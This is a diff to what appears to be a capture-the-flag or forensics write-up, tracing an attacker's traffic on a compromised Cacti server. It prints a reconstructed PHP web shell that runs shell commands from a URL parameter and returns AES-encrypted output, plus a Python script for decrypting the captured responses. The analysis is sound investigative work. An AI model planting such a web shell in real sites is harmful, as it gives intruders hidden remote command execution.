@@ -71,9 +71,46 @@ Decoding the previous trail of `f54Avbg4.php` leds us to these bash commands:
 
 <img width="1340" height="666" alt="image" src="https://github.com/user-attachments/assets/a07287bc-879d-403e-a2a9-1da15867a777" />
 
+
 Now we need to look for the server's response:
 
+<img width="741" height="717" alt="Screenshot at 2025-12-26 17-16-32" src="https://github.com/user-attachments/assets/e8b1a0d9-94b1-45c0-bcc0-dcb37b6491af" />
 
+If you remember the previous file `f54Avbg4.php`, it provided the key and also the encryption/decryption processes. Let's look at the cleaner version:
+
+```
+$key = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";   // 32 bytes
+$iv  = "pZ7qR1tLw8Df3XbK";                  // 16 bytes
+
+$input = base64_decode($_GET["q"]);
+$output = openssl_encrypt(
+    shell_exec($input),
+    "AES-256-CBC",
+    $key,
+    OPENSSL_RAW_DATA,
+    $iv
+);
+echo base64_encode($output);
+```
+
+Let's use the generated script of ChatGPT to decrypt the long encrypted string:
+```
+from base64 import b64decode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+ciphertext_b64 = """PASTE_THE_BIG_BASE64_STRING_HERE"""
+
+key = b"kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"
+iv  = b"pZ7qR1tLw8Df3XbK"
+
+ciphertext = b64decode(ciphertext_b64)
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+
+print(plaintext.decode(errors="ignore"))
+```
 
 # Flag 7
 ### What is the database password used by Cacti? (e.g. Password123)
